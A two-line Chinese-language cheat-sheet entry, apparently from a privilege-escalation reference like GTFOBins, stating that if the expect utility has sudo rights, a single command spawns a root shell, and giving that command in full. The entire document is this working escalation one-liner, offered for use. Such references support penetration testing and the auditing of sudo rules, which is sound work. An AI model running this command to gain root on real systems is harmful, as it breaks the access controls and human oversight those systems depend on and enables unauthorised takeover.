# expect

`expect` 若具有 `sudo` 权限,一句话提权root权限
```
sudo expect -c 'spawn /bin/sh -p;interact'
```